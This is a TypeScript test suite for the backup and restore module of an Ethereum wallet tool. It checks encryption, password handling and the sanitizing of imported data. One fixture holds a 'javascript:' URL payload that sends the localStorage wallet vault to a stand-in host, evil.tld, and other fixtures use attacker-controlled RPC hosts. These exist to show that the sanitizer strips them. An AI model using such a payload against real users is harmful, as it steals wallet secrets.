import { test } from "node:test"
import assert from "node:assert/strict"
import {
  applyNonSecretRestore,
  BACKUP_FORMAT,
  BACKUP_VERSION,
  backupFilename,
  createEncryptedBackup,
  createSettingsBackup,
  decryptBackup,
  inspectBackup,
  MAX_BACKUP_BYTES,
  sanitizeBackupContents,
  serializeBackup,
  summarizeRestore,
  type BackupContents,
} from "../backup"
import {
  createMemoryBackend,
  readJson,
  setStorageBackend,
  STORAGE_KEYS,
  writeJson,
  type StorageBackend,
} from "../storage"
import { isStoredBookmark, type StoredBookmark } from "../schema"

const ADDRESS = "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266"
const OTHER = "0x70997970C51812dc3A010C7d01b50e0d17dc79C8"
const HASH = "0x" + "ab".repeat(32)
const PASSWORD = "Correct-Horse-9!"
const PHRASE = "test test test test test test test test test test test junk"

function bookmark(id: string, address = ADDRESS): StoredBookmark {
  return { id, address, label: `Bookmark ${id}`, createdAt: 1 }
}

function useStore(): StorageBackend {
  const backend = createMemoryBackend()
  setStorageBackend(backend)
  return backend
}

function resetStore(): void {
  setStorageBackend(null)
}

// ===== Export =====

test("settings backup contains no secrets even when a vault exists", async () => {
  useStore()
  try {
    writeJson(STORAGE_KEYS.BOOKMARKS, [bookmark("1")])

    const file = createSettingsBackup()
    assert.equal(file.encrypted, false)
    assert.equal(file.format, BACKUP_FORMAT)
    assert.equal(file.version, BACKUP_VERSION)

    // The plaintext path must be structurally incapable of carrying secrets.
    const serialized = serializeBackup(file)
    assert.equal(serialized.includes("privateKey"), false)
    assert.equal(serialized.includes("mnemonic"), false)
    assert.equal(serialized.includes("junk"), false)

    const data = file.data as BackupContents
    assert.equal(data.accounts, undefined)
    assert.equal(data.mnemonic, undefined)
    assert.equal(data.bookmarks.length, 1)
  } finally {
    resetStore()
  }
})

test("encrypted backup hides secrets in the serialized file", async () => {
  useStore()
  try {
    writeJson(STORAGE_KEYS.BOOKMARKS, [bookmark("1")])

    const result = await createEncryptedBackup(
      {
        mnemonic: PHRASE,
        accounts: [{ id: "a", label: "Main", address: ADDRESS, privateKey: `0x${"11".repeat(32)}` }],
      },
      PASSWORD
    )
    assert.equal(result.ok, true)
    if (!result.ok) return

    assert.equal(result.value.encrypted, true)
    const serialized = serializeBackup(result.value)

    // Nothing recognizable may survive into the file.
    for (const secret of ["junk", "privateKey", "1111111111", "Bookmark 1", ADDRESS]) {
      assert.equal(serialized.includes(secret), false, `"${secret}" must not appear in the file`)
    }
  } finally {
    resetStore()
  }
})

test("encrypted backup round-trips through inspect and decrypt", async () => {
  useStore()
  try {
    writeJson(STORAGE_KEYS.BOOKMARKS, [bookmark("1")])

    const created = await createEncryptedBackup({ mnemonic: PHRASE, accounts: [] }, PASSWORD)
    assert.equal(created.ok, true)
    if (!created.ok) return

    const raw = serializeBackup(created.value)
    const inspected = inspectBackup(raw)
    assert.equal(inspected.ok, true)
    if (!inspected.ok) return
    assert.equal(inspected.value.requiresPassword, true)

    const opened = await decryptBackup(inspected.value.file, PASSWORD)
    assert.equal(opened.ok, true)
    if (!opened.ok) return

    const sanitized = sanitizeBackupContents(opened.value)
    assert.equal(sanitized.ok, true)
    if (!sanitized.ok) return
    assert.equal(sanitized.value.contents.mnemonic, PHRASE)
    assert.equal(sanitized.value.contents.bookmarks.length, 1)
  } finally {
    resetStore()
  }
})

test("wrong password fails to decrypt a backup", async () => {
  useStore()
  try {
    const created = await createEncryptedBackup({ mnemonic: PHRASE }, PASSWORD)
    assert.equal(created.ok, true)
    if (!created.ok) return

    const opened = await decryptBackup(created.value, "Wrong-Password-1!")
    assert.equal(opened.ok, false)
    if (!opened.ok) assert.match(opened.error, /Incorrect password/)
  } finally {
    resetStore()
  }
})

test("filenames distinguish encrypted from settings backups", () => {
  const settings = createSettingsBackup()
  assert.match(backupFilename(settings), /^ethtools-settings-backup-\d{4}-\d{2}-\d{2}\.json$/)
  assert.match(
    backupFilename({ ...settings, encrypted: true }),
    /^ethtools-encrypted-backup-/
  )
})

// ===== Import validation =====

test("rejects files that are not backups", () => {
  assert.equal(inspectBackup("not json").ok, false)
  assert.equal(inspectBackup("{}").ok, false)
  assert.equal(inspectBackup(JSON.stringify({ format: "something-else" })).ok, false)
  assert.equal(inspectBackup(JSON.stringify([1, 2, 3])).ok, false)
})

test("rejects an oversized file before parsing it", () => {
  const huge = "x".repeat(MAX_BACKUP_BYTES + 1)
  const result = inspectBackup(huge)
  assert.equal(result.ok, false)
  if (!result.ok) assert.match(result.error, /too large/)
})

test("rejects a newer format version", () => {
  const raw = JSON.stringify({
    format: BACKUP_FORMAT,
    version: BACKUP_VERSION + 1,
    createdAt: Date.now(),
    encrypted: false,
    data: {},
  })
  const result = inspectBackup(raw)
  assert.equal(result.ok, false)
  if (!result.ok) assert.match(result.error, /newer version/)
})

test("rejects a file claiming encryption with a malformed payload", () => {
  const raw = JSON.stringify({
    format: BACKUP_FORMAT,
    version: BACKUP_VERSION,
    createdAt: Date.now(),
    encrypted: true,
    data: { not: "an envelope" },
  })
  const result = inspectBackup(raw)
  assert.equal(result.ok, false)
  if (!result.ok) assert.match(result.error, /malformed/)
})

test("strips a javascript: explorer URL from an imported network", () => {
  // The complete import attack chain: a hostile explorerUrl reaches an anchor
  // href and can read localStorage.
  const sanitized = sanitizeBackupContents({
    activeAccountId: null,
    bookmarks: [],
    transactions: [],
    tokens: [],
    customNetworks: {
      evil: {
        name: "Evil",
        rpcUrls: ["https://rpc.example.com"],
        explorerUrl: "javascript:fetch('https://evil.tld?k='+localStorage.ethtools_vault)",
        currency: "ETH",
        type: "mainnet",
        isCustom: true,
      },
    },
  })

  assert.equal(sanitized.ok, true)
  if (!sanitized.ok) return
  assert.deepEqual(Object.keys(sanitized.value.contents.customNetworks), [])
  assert.ok(sanitized.value.dropped > 0)
})

test("strips a plaintext http RPC endpoint", () => {
  const sanitized = sanitizeBackupContents({
    activeAccountId: null,
    bookmarks: [],
    transactions: [],
    tokens: [],
    customNetworks: {
      mitm: {
        name: "MITM",
        rpcUrls: ["http://attacker.tld"],
        explorerUrl: "",
        currency: "ETH",
        type: "mainnet",
        isCustom: true,
      },
    },
  })
  assert.equal(sanitized.ok, true)
  if (!sanitized.ok) return
  assert.deepEqual(Object.keys(sanitized.value.contents.customNetworks), [])
})

test("refuses to let an imported network shadow a built-in key", () => {
  // Shadowing "mainnet" would silently repoint Ethereum Mainnet.
  const hostile = {
    name: "Fake Mainnet",
    rpcUrls: ["https://attacker.tld"],
    explorerUrl: "",
    currency: "ETH",
    type: "mainnet",
    isCustom: true,
  }

  const sanitized = sanitizeBackupContents(
    {
      activeAccountId: null,
      bookmarks: [],
      transactions: [],
      tokens: [],
      customNetworks: { mainnet: hostile, "my-chain": hostile },
    },
    ["mainnet", "sepolia"]
  )

  assert.equal(sanitized.ok, true)
  if (!sanitized.ok) return
  assert.deepEqual(Object.keys(sanitized.value.contents.customNetworks), ["my-chain"])
  assert.ok(sanitized.value.dropped >= 1)
})

test("drops corrupt records but keeps valid ones and reports the count", () => {
  const sanitized = sanitizeBackupContents({
    activeAccountId: null,
    bookmarks: [bookmark("1"), { id: "2", address: "junk", label: "Bad", createdAt: 2 }],
    transactions: [
      {
        hash: HASH,
        network: "mainnet",
        from: ADDRESS,
        to: OTHER,
        amount: "1.0",
        currency: "ETH",
        timestamp: 1,
        status: "success",
      },
      { hash: "failed-12345", network: "mainnet", from: ADDRESS, to: OTHER, amount: "1", currency: "ETH", timestamp: 1, status: "failed" },
    ],
    tokens: [],
    customNetworks: {},
  })

  assert.equal(sanitized.ok, true)
  if (!sanitized.ok) return
  assert.equal(sanitized.value.contents.bookmarks.length, 1)
  assert.equal(
    sanitized.value.contents.transactions.length,
    1,
    "a synthetic failed-<timestamp> hash must be dropped"
  )
  assert.equal(sanitized.value.dropped, 2)
})

test("rejects non-object contents", () => {
  assert.equal(sanitizeBackupContents(null).ok, false)
  assert.equal(sanitizeBackupContents("nope").ok, false)
})

// ===== Restore =====

test("replace mode overwrites existing non-secret data", () => {
  useStore()
  try {
    writeJson(STORAGE_KEYS.BOOKMARKS, [bookmark("existing")])

    const result = applyNonSecretRestore(
      {
        activeAccountId: null,
        bookmarks: [bookmark("imported")],
        transactions: [],
        customNetworks: {},
        tokens: [],
      },
      "replace"
    )
    assert.equal(result.ok, true)

    const stored = readJson<StoredBookmark[]>(
      STORAGE_KEYS.BOOKMARKS,
      (v): v is StoredBookmark[] => Array.isArray(v) && v.every(isStoredBookmark),
      []
    )
    assert.deepEqual(
      stored.map((b) => b.id),
      ["imported"]
    )
  } finally {
    resetStore()
  }
})

test("merge mode keeps existing data and adds new records", () => {
  useStore()
  try {
    writeJson(STORAGE_KEYS.BOOKMARKS, [bookmark("existing")])

    const result = applyNonSecretRestore(
      {
        activeAccountId: null,
        bookmarks: [bookmark("existing"), bookmark("imported", OTHER)],
        transactions: [],
        customNetworks: {},
        tokens: [],
      },
      "merge"
    )
    assert.equal(result.ok, true)

    const stored = readJson<StoredBookmark[]>(
      STORAGE_KEYS.BOOKMARKS,
      (v): v is StoredBookmark[] => Array.isArray(v) && v.every(isStoredBookmark),
      []
    )
    assert.deepEqual(
      stored.map((b) => b.id).sort(),
      ["existing", "imported"],
      "duplicate ids must not be added twice"
    )
  } finally {
    resetStore()
  }
})

test("merge mode does not let an import repoint an existing network", () => {
  useStore()
  try {
    const original = {
      name: "My Chain",
      rpcUrls: ["https://good.example.com"],
      explorerUrl: "",
      currency: "ETH",
      type: "mainnet" as const,
      isCustom: true as const,
    }
    writeJson(STORAGE_KEYS.CUSTOM_NETWORKS, { mine: original })

    applyNonSecretRestore(
      {
        activeAccountId: null,
        bookmarks: [],
        transactions: [],
        tokens: [],
        customNetworks: {
          mine: { ...original, rpcUrls: ["https://attacker.example.com"] },
        },
      },
      "merge"
    )

    const stored = readJson<Record<string, { rpcUrls: string[] }>>(
      STORAGE_KEYS.CUSTOM_NETWORKS,
      (v): v is Record<string, { rpcUrls: string[] }> => typeof v === "object" && v !== null,
      {}
    )
    assert.deepEqual(stored.mine.rpcUrls, ["https://good.example.com"])
  } finally {
    resetStore()
  }
})

test("restore never writes secrets to storage", () => {
  useStore()
  try {
    applyNonSecretRestore(
      {
        activeAccountId: null,
        mnemonic: PHRASE,
        accounts: [{ id: "a", label: "Main", address: ADDRESS, privateKey: `0x${"11".repeat(32)}` }],
        bookmarks: [],
        transactions: [],
        customNetworks: {},
        tokens: [],
      },
      "replace"
    )

    // Secrets must be re-sealed into the vault by the caller, never written raw.
    for (const key of Object.values(STORAGE_KEYS)) {
      const raw = readJson<unknown>(key, (v): v is unknown => true, null)
      const serialized = JSON.stringify(raw ?? null)
      assert.equal(serialized.includes("junk"), false, `${key} must not hold the phrase`)
      assert.equal(serialized.includes("privateKey"), false, `${key} must not hold a key`)
    }
  } finally {
    resetStore()
  }
})

test("summarizes a restore for confirmation", () => {
  const summary = summarizeRestore(
    {
      activeAccountId: "a",
      mnemonic: PHRASE,
      accounts: [{ id: "a", label: "Main", address: ADDRESS }],
      bookmarks: [bookmark("1")],
      transactions: [],
      customNetworks: {},
      tokens: [],
    },
    3
  )

  assert.equal(summary.accounts, 1)
  assert.equal(summary.bookmarks, 1)
  assert.equal(summary.includedMnemonic, true)
  assert.equal(summary.droppedRecords, 3)
})
